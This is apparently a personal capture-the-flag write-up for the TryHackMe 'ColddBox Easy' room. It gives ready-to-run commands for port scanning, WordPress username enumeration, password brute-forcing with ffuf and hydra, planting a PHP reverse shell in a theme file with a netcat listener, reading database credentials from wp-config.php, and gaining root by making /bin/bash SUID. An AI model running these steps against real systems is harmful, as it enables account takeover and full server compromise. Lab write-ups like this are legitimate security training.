```http
https://tryhackme.com/room/colddboxeasy
```

```ip
10.10.145.74
```
___
# Recon
## Nmap
```bash
sudo nmap -p- -sC -sV -T5 -Pn 10.10.145.74 -vv
```

```resoults
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web
### Endpoints
```http
http://10.10.145.74/?feed=comments-rss2
http://10.10.145.74/?p=1#comments
http://10.10.145.74/wp-login.php
```

### WPscan
```bash
wpscan --url http://10.10.145.74/
```

```resoults
Server: Apache/2.4.18 (Ubuntu)
WordPress version 4.1.31 identified
WordPress theme in use: twentyfifteen
```
___
### Check users wordpress
```bash
ffuf -u "http://10.10.145.74/wp-login.php" -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
-d "log=FUZZ&pwd=invalidpassword&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
-w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -mc all -fs 3408
```

```resoult
philip
hugo
c0ldd
```

### Bruteforse password's
```bash
ffuf -u "http://10.10.145.74/wp-login.php" -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
-d "log=philip&pwd=FUZZ&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
-w /usr/share/wordlists/rockyou.txt -mc 200,302 -fs 3455
```

```resoults
panda
```

```bash
hydra -l hugo -P /usr/share/wordlists/rockyou.txt 10.10.145.74 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:F=incorrect" \
-t 64 -V -f
```

```resoults
[80][http-post-form] host: 10.10.145.74   login: hugo   password: 147852
```

```bash
ffuf -u "http://10.10.145.74/wp-login.php" -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
-d "log=c0ldd&pwd=FUZZ&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
-w /usr/share/wordlists/rockyou.txt -mc 200,302 -fs 3453
```

```bingo
[80][http-post-form] host: 10.10.145.74   login: *****   password: **********
```
___
# RCE
In wordpress account need add php revers shell in Appearance -> Edit Themes
I use index.php
```http
https://www.revshells.com/
```

```bash
nc -lnvp 1337
```

```http
curl http://10.10.145.74/index.php
```
___
# LPE
```bash
cat wp-config.php
```

```resoults
/** MySQL database username */
define('DB_USER', '*****');

/** MySQL database password */
define('DB_PASSWORD', '************');
```
## SSH

> [!important]
> 4512/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

```bash
ssh *****@10.10.145.74
```

```bash
sudo -l 
```

```resoults
El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

```bash
sudo -u root /bin/chmod u+s /bin/bash
```

```bash
cat /root/root.txt
```
